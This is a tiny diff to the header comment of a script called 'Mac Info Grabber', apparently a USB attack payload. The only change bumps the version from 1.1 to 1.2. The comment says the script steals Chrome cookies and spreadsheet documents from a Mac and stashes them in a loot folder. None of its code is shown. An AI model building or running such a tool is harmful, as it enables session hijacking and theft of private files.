@@ -2,7 +2,7 @@
 #
 # Title:         Mac Info Grabber
 # Author:        kmakblob
-# Version:       1.1
+# Version:       1.2
 #
 # Steaks cookies from chrome and documents from the documents folder (spreadsheets)
 # then stashes them in /root/udisk/loot/MacLoot
